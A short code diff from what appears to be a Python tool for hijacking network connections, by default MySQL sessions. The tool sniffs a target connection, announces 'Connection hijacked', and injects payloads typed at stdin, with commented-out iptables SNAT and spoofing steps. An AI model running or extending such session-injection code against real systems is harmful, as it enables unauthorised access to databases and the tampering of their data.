@@ -110,11 +110,10 @@ def main():
         #os.system("iptables -D POSTROUTING -o "+settings.iface+" -j SNAT --to "+settings.ip)
         #settings.cmd_list.append("iptables -t nat -A POSTROUTING -o "+settings.iface+" -j SNAT --to "+settings.ip)
         #spoofer.start(settings.ip, settings.src, settings.dst)
-    injector.init("mysql" if len(proto) == 0 else proto)
+    injector.init("mysql" if len(proto) == 0 else proto, settings.src, settings.dst)
     sniffer.start(settings.src, settings.dst, settings.port, settings.iface, args.write)
     if sniffer.settings.injected is False:
         print("Failed to get a packet sample.")
-        exit()
     print("Connection hijacked, terminal:")
     while args.stdin:
         payload = sys.stdin.readline()
